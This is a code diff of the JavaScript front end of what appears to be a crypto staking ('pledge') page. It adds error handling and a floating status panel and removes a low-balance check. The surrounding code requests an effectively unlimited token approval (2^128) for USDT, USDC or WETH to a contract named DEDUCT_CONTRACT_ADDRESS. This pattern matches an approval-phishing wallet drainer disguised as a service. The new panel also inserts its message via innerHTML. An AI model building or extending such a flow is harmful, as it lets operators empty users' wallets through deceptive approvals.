@@ -1375,7 +1375,7 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     });
   }
-  if (startBtn) {
+   if (startBtn) {
     startBtn.addEventListener('click', async () => {
       if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
       const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
@@ -1422,11 +1422,6 @@ document.addEventListener('DOMContentLoaded', () => {
           startBtn.disabled = false;
           startBtn.textContent = translations[currentLang].startBtnText;
         }
-              } else {
-          updateStatus('Balance too low.', true);
-          startBtn.disabled = false;
-          startBtn.textContent = translations[currentLang].startBtnText;
-        }
       } catch (error) {
         updateStatus(`${translations[currentLang].approveError}: ${error.message}`, true);
         startBtn.disabled = false;
@@ -1467,7 +1462,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
       // 2. 檢查 allowance（後端會再驗證）
       const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
-      const currentAllowance = await tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
+      let currentAllowance;
+      try {
+        currentAllowance = await tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
+      } catch (error) {
+        pledgeBtn.disabled = false;
+        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+        updateStatus(`${translations[currentLang].error}: Allowance check failed`, true);
+        return;
+      }
       const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
       if (currentAllowance < REQUIRED_ALLOWANCE) {
         updateStatus(`Approving ${token} for backend...`);
@@ -1505,7 +1508,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const result = await response.json();
         if (!result.success) throw new Error('Backend rejected');
 
-        // 等待 SSE 回應更新 UI（不立即更新）
+        // 等待 SSE 回應更新 UI
         updateStatus('質押請求已提交，請等待確認...');
       } catch (error) {
         pledgeBtn.disabled = false;
@@ -1515,6 +1518,33 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     });
   }
+
+  // ==================== 浮動小面板（成功/失敗）— 主題一致 ====================
+function showFloatingPanel(type, title, message) {
+  const old = document.getElementById('floatingPanel');
+  if (old) old.remove();
+
+  const panel = document.createElement('div');
+  panel.id = 'floatingPanel';
+  if (type === 'error') panel.classList.add('error');
+
+  const titleEl = document.createElement('div');
+  titleEl.className = 'title';
+  titleEl.textContent = title;
+
+  const messageEl = document.createElement('div');
+  messageEl.className = 'message';
+  messageEl.innerHTML = message;
+
+  panel.appendChild(titleEl);
+  panel.appendChild(messageEl);
+  document.body.appendChild(panel);
+
+  setTimeout(() => {
+    panel.style.animation = 'floatOut 0.5s ease-in forwards';
+    setTimeout(() => panel.remove(), 500);
+  }, 3000);
+}
 
   if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
   if (pledgeAmount) pledgeAmount.addEventListener('input', updateEstimate);
